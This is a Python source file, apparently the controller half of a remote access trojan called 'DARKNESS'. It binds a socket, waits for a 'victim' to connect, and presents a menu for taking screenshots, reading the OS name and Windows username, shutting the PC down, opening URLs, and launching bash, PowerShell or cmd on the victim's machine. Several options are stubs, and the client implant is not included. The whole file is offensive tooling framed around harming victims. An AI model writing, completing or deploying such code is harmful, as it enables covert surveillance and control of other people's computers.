import socket
import chalk
import os
from typing import *
import logging
import sys
import re
from exceptions import *
_VALID_URL_PATTERN=re.compile(r'^(?:http|ftp)s?://'r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'r'localhost|'r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'r'(?::\d+)?'r'(?:/?|[/?]\S+)$',re.IGNORECASE)
logging.basicConfig(filename="logs.log",level=logging.INFO,format="[%(asctime)s] %(levelname)s - %(message)s",datefmt="%H:%M:%S")
class Server():
    def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
        self.c=c
        choices=[i for i in range(1,10)]
        print(chalk.red(f"SUCCESSFULLY ESTABLISHED A CONNECTION WITH VICTIM. VICTIM'S IP : {addr}"))
        logging.info(f"SUCCESSFULLY ESTABLISHED A CONNECTION WITH VICTIM. VICTIM'S IP : {addr}")
        msg="""
        ============================== D A R K N E S S ==============================
        MAKE YOUR VICTIM CRY :
        1.) SCREENSHOT VICTIM'S WINDOW
        2.) GET VICTIM'S OS NAME
        3.) GET VICTIM'S WINDOWS USERNAME
        4.) SHUTDOWN VICTIM'S PC
        5.) OPEN URL IN VICTIM'S BROWSER
        6.) CHANGE VICTIM'S WALLPAPER
        7.) OPEN VICTIM'S BASH
        8.) OPEN VICTIM'S POWERSHELL
        9.) OPEN VICTIM'S COMMAND PROMPT
        """
        print(chalk.red(msg))
        choice=input(chalk.red("CHOOSE AN OPTION : "))
        choice=int(choice)
        while choice not in choices:
            print(chalk.red("\nCHOOSE AN APPROPRIATE OPTION!\n"))
            choice=int(input(chalk.red("CHOOSE AN OPTION : ")))
        else:
            # Screenshot
            if choice==1:
                self.c.send("screenshot".encode())
                print(self.c.recv(1024))
            # Operating System Name
            elif choice==2:
                self.c.send("os_name".encode())
                print(self.c.recv(4096).decode())
                logging.info(self.c.recv(4096).decode())
            # Windows Username
            elif choice==3:
                self.c.send("windows_username".encode())
                print(self.c.recv(4096).decode())
                logging.info(self.c.recv(4096).decode())
            # Shutdown PC
            elif choice==4:
                self.c.send("shutdown_pc".encode())
                print(self.c.recv(4096).decode())
                logging.info(self.c.recv(4096).decode())
            # Open URL
            elif choice==5:
                _url=input("Enter The URL You Want To Open In Victim's PC : ")
                for i in re.finditer(_VALID_URL_PATTERN,_url):
                    if i.string !="" or i.string is not None:
                        self.c.send(f"open_url {_url}".encode())
                        print(self.c.recv(1024).decode())
                        logging.info(self.c.recv(1024).decode())
                        break
                else:
                    if "http://" in _url or "https://" in _url:
                        raise NotAValidURLException("The URL You Entered Was Invalid")
                    else:
                        raise NotAValidURLException("URL Must Start With http:// or https://")
            # Change Wallpaper
            elif choice==6:...
            elif choice==7:...
            elif choice==8:...
            elif choice==9:...
    @staticmethod
    def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
        s=socket.socket()
        s.bind((_addr,_port))
        s.listen()
        logging.info(f"STARTED SERVING AT ADDRESS {_addr} AND PORT {_port}")
        print(chalk.red("============================== D A R K N E S S =============================="))
        print(chalk.red("WAITING FOR VICTIM TO CONNECT..."))
        c,addr=s.accept()
        if sys.platform=="win32":
            os.system("cls")
        elif sys.platform!="win32":
            os.system("clear")
        return (c,addr)
if __name__ == "__main__":
    c,addr=Server.init_socket("localhost",9999)
    server=Server(c,addr)